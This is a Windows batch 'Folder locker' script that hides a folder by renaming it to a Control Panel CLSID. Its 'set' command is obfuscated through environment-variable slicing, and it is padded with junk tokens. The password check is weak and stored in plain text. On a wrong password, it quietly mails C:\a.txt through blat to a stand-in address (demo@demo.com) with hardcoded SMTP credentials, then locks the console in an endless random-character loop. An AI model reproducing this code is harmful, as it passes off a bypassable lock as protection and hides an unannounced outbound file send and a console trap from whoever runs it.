%%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a   
cls  
@ECHO OFF  
if "%1".=="max". goto top
start "" /max "%~nx0" max
exit
:top
::下面是批处理代码
%windir:~-1,1%%ComSpec:~-1,1%%tmp:~-4,1% pas= 
title Folder locker  
if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK  
if NOT EXIST locker goto MDLOCKER  
:CONFIRM  
echo Are you sure you want to lock the folder(Y/N)  
set/p "cho=>"  
if %cho%==Y goto LOCK  
if %cho%==y goto LOCK  
if %cho%==n goto END  
if %cho%==N goto END  
echo Invalid choice.  
goto CONFIRM  
:LOCK  
ren locker "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"  
attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"  
echo Folder locked  
goto End  
:UNLOCK  
echo Enter password to unlock folder  
set/p "pass=>"  
if NOT %pas%%pass%%pas%== locker goto FAIL  
attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"  
ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" locker  
echo Folder Unlocked successfully  
goto End  
:FAIL  
echo Invalid password 
echo 
blat -install smtp.demo.com  demo@demo.com
blat C:\a.txt -to  demo@demo.com  -u  demo@demo.com  -pw password  -subject  warning
color 0a
setlocal ENABLEDELAYEDEXPANSION
for /l %%i in (0) do (
set "line="
for /l %%j in (1,1,80) do (
set /a Down%%j-=2
set "x=!Down%%j!"
if !x! LSS 0 (
set /a Arrow%%j=!random!%%3
set /a Down%%j=!random!%%15+10
)
set "x=!Arrow%%j!"
if "!x!" == "2" (
set "line=!line!!random:~-1! "
) else (set "line=!line! ")
)
set /p=!line!<nul
)
goto end  
:MDLOCKER  
md locker  
echo locker created successfully  
goto End  
:End  
exit
